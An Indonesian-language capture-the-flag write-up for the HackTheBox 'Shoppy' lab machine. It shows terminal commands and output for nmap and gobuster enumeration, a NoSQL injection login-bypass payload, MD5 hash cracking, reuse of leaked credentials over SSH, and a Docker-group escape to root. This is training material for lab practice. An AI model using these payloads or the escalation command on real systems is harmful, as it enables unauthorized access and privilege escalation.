---
title: "HackTheBox - Shoppy WriteUps"
date: 2022-09-24 15:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox Shoppy Writeups

### Kita mulai dengan memindai port mesin dengan nmap dan port yang terbuka seperti command terminal dibawah
```terminal
┌──(root㉿yupy)-[~]
└─# nmap -sC -sV 10.10.11.180 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 01:04 PDT
Nmap scan report for 10.10.11.180 (10.10.11.180)
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.47 seconds

```

### Tampilan port 80 yang terbuka adalah seperti dibawah ini
![image](https://media.discordapp.net/attachments/740245586095112242/1023151800922161182/unknown.png?width=1350&height=581)

### Kita coba mencari directory dengan dirsearch
```terminal
┌──(root㉿yupy)-[~]
└─# dirsearch -u http://shoppy.htb/  -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/shoppy.htb/-_22-09-24_01-05-52.txt

Error Log: /root/.dirsearch/logs/errors-22-09-24_01-05-52.log

Target: http://shoppy.htb/

[01:05:53] Starting: 
[01:05:53] 301 -  171B  - /js  ->  /js/                                    
[01:06:05] 302 -   28B  - /ADMIN  ->  /login                                
[01:06:05] 302 -   28B  - /Admin  ->  /login                                
[01:06:16] 302 -   28B  - /admin  ->  /login                                
[01:06:16] 302 -   28B  - /admin/?/login  ->  /login                        
[01:06:16] 302 -   28B  - /admin/  ->  /login                               
[01:06:31] 301 -  179B  - /assets  ->  /assets/                             
[01:06:42] 301 -  173B  - /css  ->  /css/                                   
[01:06:51] 301 -  177B  - /fonts  ->  /fonts/                               
[01:06:51] 200 -  208KB - /favicon.ico                                      
[01:06:56] 301 -  179B  - /images  ->  /images/                             
[01:07:02] 200 -    1KB - /login                                            
[01:07:02] 200 -    1KB - /login/
```
### Tampaknya /admin memberi kita pengalihan ke /login: http://shoppy.htb/login

![image](https://media.discordapp.net/attachments/740245586095112242/1023152652256821278/unknown.png?width=439&height=579)

### Kita coba untuk Authentication Bypass NoSQL Injection dengan menggunakan payload dibawah ini
```terminal
admin'||'1==1
```
![image](https://media.discordapp.net/attachments/740245586095112242/1023153276222459934/unknown.png?width=1440&height=350)

### Setelah berhasil masuk ke halaman admin, kita coba untuk mencari file konfigurasi yang terdapat pada server. dengan parameter search yang ada di halaman admin
```terminal
http://shoppy.htb/admin/search-users?username=admin'||'1==1
```
![image](https://media.discordapp.net/attachments/740245586095112242/1023152533289570365/unknown.png)

### Kita mendapatkan Informasi admin dan password yang terdapat pada file konfigurasi, kita coba dengan crack password yang kita dapatkan dengan crackstation.net
```terminal
23c6877d9e2b564ef8b32c3a23de27b2	Unknown	Not found.
6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
```
![image](https://media.discordapp.net/attachments/740245586095112242/1023154335892394124/unknown.png)


### kita coba menggunakan gobuster untuk mencari subdomain potensial untuk memperluas permukaan serangan kami. kami menggunakan GoBuster untuk mencari subdomain yang tersembunyi
```terminal
┌──(root㉿yupy)-[~]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/24 01:08:36 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2022/09/24 01:10:28 Finished
===============================================================
```

### dari scan gobuster kita menemukan subdomain mattermost.shoppy.htb dan jangan lupa kita menambahan pada /etc/hosts, mari kita coba buka di browser

![image](https://media.discordapp.net/attachments/740245586095112242/1023151365243015168/unknown.png?width=1440&height=561)

### dan kita coba login menggunakan username dan password yang kita dapatkan sebelumnya
```terminal
Username: josh
Password: remembermethisway
```

### dan kita berhasil login ke mattermost. kita coba cari informasi penting yang ada di mattermost dan kita mendapatkan:
```terminal
1. Username: jaeger
2. Password: Sh0ppyBest@pp!
```
![image](https://media.discordapp.net/attachments/740245586095112242/1023151030071984168/unknown.png)

### Kita coba login pada ssh dengan menggunakan username dan password yang kita dapatkan sebelumnya
```terminal
┌──(root㉿yupy)-[~]
└─# ssh jaeger@10.10.11.180
jaeger@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ ls
Desktop    Downloads  Pictures  ShoppyApp        Templates  Videos
Documents  Music      Public    shoppy_start.sh  user.txt
jaeger@shoppy:~$ cat user.txt
1******************7
```
### Selanjutnya kita coba Privilege Escalation dengan menggunakan "sudo -l" untuk melihat apakah kita memiliki akses sudo
```terminal
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```
### dan kita mendapatkan akses sudo untuk user deploy dan kita coba untuk menjalankan password-manager. dan kita mendapatkan informasi penting yang ada di password-manager dan membaca file "cat password-manager"
```terminal
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !

Password: Sample
```

### kita coba kembali ke sudo privilege escalation dengan menggunakan "sudo -l". dengan command dibawah
```terminal
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

### kita berpindah ke ssh yang baru dengan menggunakan username dan password yang kita dapatkan.
```terminal
┌──(root㉿yupy)-[~]
└─# ssh deploy@10.10.11.180
deploy@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ whoami
deploy
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
$ pwd
/home/deploy
```

### Privilege Escalation Post Exploitation: Root via Docker Escape menggunakan [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/) dan kita coba untuk menjalankan command dibawah
```terminal
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```terminal
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

### dan kita berhasil menjadi root dan kita coba untuk membaca file "root.txt"
```terminal
# cd root
# ls
root.txt
# cat root.txt
0******************6
```
![image](https://media.discordapp.net/attachments/740245586095112242/1023158695875584010/HTBShoppy.png?width=640&height=580)

